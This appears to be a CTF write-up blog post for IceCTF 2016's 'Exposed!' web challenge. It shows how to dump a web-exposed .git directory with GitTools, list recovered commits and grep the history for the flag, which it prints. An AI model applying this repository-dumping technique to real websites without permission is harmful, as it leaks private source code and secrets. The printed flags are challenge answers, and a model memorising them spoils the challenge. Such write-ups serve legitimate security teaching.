@@ -1,0 +1,198 @@
+---
+layout: post
+title: "IceCTF - 60 - Exposed! - Web"
+lang: en
+categories:
+  - security
+  - writeups
+tags:
+  - security
+  - writeups
+  - ctf
+  - web
+date: 2016/08/25
+thumbnail: /images/security-265130_640.jpg
+---
+## Informations
+
+### Version
+
+| By    | Version | Comment
+| ---   | ---     | ---
+| noraj | 1.0     | Creation
+
+### CTF
+
+- **Name** : IceCTF 2016
+- **Website** : [https://icec.tf/](https://icec.tf/)
+- **Type** : Online
+- **Format** : Jeopardy
+- **CTF Time** : [link](https://ctftime.org/event/319)
+
+### Description
+
+John is pretty happy with himself, he just made his first [website](http://exposed.vuln.icec.tf/)! He used all the hip and cool systems, like NginX, PHP and Git! Everyone is so happy for him, but can you get him to give you the flag?
+
+## Solution
+
+1. Description tell us we're looking for a web hosted git repository.
+2. Let's try `http://exposed.vuln.icec.tf/.git/`.
+3. Oh I forgot to say! We are lazy and this tool is amazing: [GitTools](https://github.com/internetwache/GitTools).
+4. Dump the git repo : `./gitdumper.sh http://exposed.vuln.icec.tf/.git/ repo`.
+5. Let's see what we get in there:
+```
+ls -A1 repo/.git/
+COMMIT_EDITMSG
+HEAD
+config
+description
+index
+info
+logs
+objects
+packed-refs
+refs
+```
+6. Let's see `COMMIT_EDITMSG`:
+```
+cat .git/COMMIT_EDITMSG
+add robots.txt
+
+# Please enter the commit message for your changes. Lines starting
+# with '#' will be ignored, and an empty message aborts the commit.
+#
+# Author:    James Sigurðarson <jamiees2@gmail.com>
+# Date:      Wed Aug 10 21:47:49 2016 +0000
+#
+# On branch master
+# Changes to be committed:
+#	new file:   robots.txt
+#
+# Untracked files:
+#	rewrite-history.sh
+#
+```
+7. Interesting there is a `robots.txt`, we should have look to it sooner: [http://exposed.vuln.icec.tf/robots.txt](http://exposed.vuln.icec.tf/robots.txt)
+```
+User-Agent: *
+Disallow: /.git
+Disallow: /flag.php
+```
+8. Oh yeah a `flag.php` file! Let's go to [http://exposed.vuln.icec.tf/flag.php](http://exposed.vuln.icec.tf/flag.php): there is nothing anymore here.
+9. But maybe we can found an older version of `flag.php` with git!
+10. Want to dig into git HEAD and all? Nah! There still is [GitTools](https://github.com/internetwache/GitTools).
+11. Let's extract all now: `./extractor.sh repo/ repodump/`.
+12. There is a lot of stuff in here:
+```
+ls -RA repodump
+repodump:
+0-60756b184c2d6b8f0247c152d8549562bc14d2d9   14-b536a10b5453686bd1dfcc50da3cb156c321fb5f  2-adf0ebdff8a972f3f6158304323feba4aa1fd482   25-631503ff237e145c7bade484c44c05a223b51155  4-cda8cc0acc8a09153351e43c40f4abeb7a823a03
+1-6034c348380c9709715e6af60d04f684867d7234   15-e9f1db96f8b67eced8183d2d523e4ea76c008b83  20-32b31838b757a00f2e296ac198ca7d9cb930e644  26-90c2cd27cabb8ec7f55941ecee004558a070ccde  5-68162dcb661493c295f3913b1c1da2b198adfdd8
+10-fd2ac4d5260ee06f9a0e5f4808bf3862e2065fb8  16-ec95d11bb37f00fb8e17f6bdbb800124b79e3c32  21-5ea13398f975b53ff30b7ea162b2ec6897a48c68  27-541e08f75514d1caec2a62fe3a1af308da6f35d8  6-f5674cbaacd842cfacb9f825c29f7f3e5150c7ef
+11-4183a0cd7143899e4a5d34f01ce58317fd68921e  17-590a15d32d9a494be5830f61c5c180ddef86e43e  22-ebe74d8641b4d8b90c33d1deb69070476b0ef402  28-4de7e6fbbba6f94bc146b33bbfe6c0155f3c2fd4  7-f521418118a088ef00fef0c3e199d30d6c7e96a5
+12-175e312b3d3aeab77ada20ed93d1c9a3f2caf429  18-6b3e1ffdc1d679c4815f08ef1d70d1b955451b36  23-97dcb30a5862aa43984b8beee84c9477a7315856  29-bf55633224c5c76f49d42621ace07aa705ebae6e  8-584ae8349fe51e2cb25e11347003c11e92f88c74
+13-1746e11be489319bd8900318874b68304eb05288  19-1f601ea8a09052234b53e2cc1bb12e4ceacbf8a6  24-971c67fd8ed67c3986844f627917c19c151d00bf  3-d70b2e576c0f35e83d70027434050e06f729662b   9-672c8f636b6db9c79412db177dcca75cde27c82b
+
+repodump/0-60756b184c2d6b8f0247c152d8549562bc14d2d9:
+.gitignore  commit-meta.txt  flag.php  index.php
+
+repodump/1-6034c348380c9709715e6af60d04f684867d7234:
+.gitignore  commit-meta.txt  flag.php  index.php
+
+repodump/10-fd2ac4d5260ee06f9a0e5f4808bf3862e2065fb8:
+commit-meta.txt  index.php
+
+repodump/11-4183a0cd7143899e4a5d34f01ce58317fd68921e:
+.gitignore  commit-meta.txt  flag.php  index.php  robots.txt
+
+repodump/12-175e312b3d3aeab77ada20ed93d1c9a3f2caf429:
+commit-meta.txt  index.php
+
+repodump/13-1746e11be489319bd8900318874b68304eb05288:
+.gitignore  commit-meta.txt  flag.php  index.php  robots.txt
+
+repodump/14-b536a10b5453686bd1dfcc50da3cb156c321fb5f:
+.gitignore  commit-meta.txt  index.php
+
+repodump/15-e9f1db96f8b67eced8183d2d523e4ea76c008b83:
+.gitignore  commit-meta.txt  flag.php  index.php  robots.txt
+
+repodump/16-ec95d11bb37f00fb8e17f6bdbb800124b79e3c32:
+.gitignore  commit-meta.txt  index.php
+
+repodump/17-590a15d32d9a494be5830f61c5c180ddef86e43e:
+.gitignore  commit-meta.txt  flag.php  index.php  robots.txt
+
+repodump/18-6b3e1ffdc1d679c4815f08ef1d70d1b955451b36:
+.gitignore  commit-meta.txt  index.php
+
+repodump/19-1f601ea8a09052234b53e2cc1bb12e4ceacbf8a6:
+.gitignore  commit-meta.txt  index.php
+
+repodump/2-adf0ebdff8a972f3f6158304323feba4aa1fd482:
+.gitignore  commit-meta.txt  flag.php  index.php
+
+repodump/20-32b31838b757a00f2e296ac198ca7d9cb930e644:
+.gitignore  commit-meta.txt  flag.php  flag.txt  index.php
+
+repodump/21-5ea13398f975b53ff30b7ea162b2ec6897a48c68:
+.gitignore  commit-meta.txt  flag.php  index.php
+
+repodump/22-ebe74d8641b4d8b90c33d1deb69070476b0ef402:
+.gitignore  commit-meta.txt  index.php
+
+repodump/23-97dcb30a5862aa43984b8beee84c9477a7315856:
+.gitignore  commit-meta.txt  flag.php  index.php
+
+repodump/24-971c67fd8ed67c3986844f627917c19c151d00bf:
+.gitignore  commit-meta.txt  index.php
+
+repodump/25-631503ff237e145c7bade484c44c05a223b51155:
+.gitignore  commit-meta.txt  flag.php  index.php
+
+repodump/26-90c2cd27cabb8ec7f55941ecee004558a070ccde:
+.gitignore  commit-meta.txt  index.php
+
+repodump/27-541e08f75514d1caec2a62fe3a1af308da6f35d8:
+.gitignore  commit-meta.txt  flag.php  flag.txt  index.php
+
+repodump/28-4de7e6fbbba6f94bc146b33bbfe6c0155f3c2fd4:
+.gitignore  commit-meta.txt  index.php
+
+repodump/29-bf55633224c5c76f49d42621ace07aa705ebae6e:
+.gitignore  commit-meta.txt  index.php
+
+repodump/3-d70b2e576c0f35e83d70027434050e06f729662b:
+.gitignore  commit-meta.txt  index.php
+
+repodump/4-cda8cc0acc8a09153351e43c40f4abeb7a823a03:
+.gitignore  commit-meta.txt  index.php
+
+repodump/5-68162dcb661493c295f3913b1c1da2b198adfdd8:
+.gitignore  commit-meta.txt  flag.php  index.php
+
+repodump/6-f5674cbaacd842cfacb9f825c29f7f3e5150c7ef:
+.gitignore  commit-meta.txt  index.php
+
+repodump/7-f521418118a088ef00fef0c3e199d30d6c7e96a5:
+.gitignore  commit-meta.txt  index.php
+
+repodump/8-584ae8349fe51e2cb25e11347003c11e92f88c74:
+.gitignore  commit-meta.txt  flag.php  flag.txt  index.php
+
+repodump/9-672c8f636b6db9c79412db177dcca75cde27c82b:
+.gitignore  commit-meta.txt  index.php
+```
+13. Still to lazy to dig with git? Ok let's use `grep`:
+```
+grep -r -i icectf{ repodump/
+repodump/20-32b31838b757a00f2e296ac198ca7d9cb930e644/flag.txt:IceCTF{this_isnt_the_flag_either}
+repodump/7-f521418118a088ef00fef0c3e199d30d6c7e96a5/index.php:            font-size: 2em; /* IceCTF{secure_y0ur */
+repodump/8-584ae8349fe51e2cb25e11347003c11e92f88c74/flag.txt:IceCTF{this_isnt_the_flag_either}
+repodump/0-60756b184c2d6b8f0247c152d8549562bc14d2d9/flag.php:                    echo 'IceCTF{not_this_flag}';
+repodump/6-f5674cbaacd842cfacb9f825c29f7f3e5150c7ef/index.php:                echo 'Hello World! IceCTF{secure_y0ur_g1t_repos_pe0ple}';
+repodump/18-6b3e1ffdc1d679c4815f08ef1d70d1b955451b36/index.php:                echo 'Hello World! IceCTF{secure_y0ur_g1t_repos_pe0ple}';
+repodump/27-541e08f75514d1caec2a62fe3a1af308da6f35d8/flag.txt:IceCTF{this_isnt_the_flag_either}
+repodump/23-97dcb30a5862aa43984b8beee84c9477a7315856/flag.php:                    echo 'IceCTF{not_this_flag}';
+```
+14. Tada!
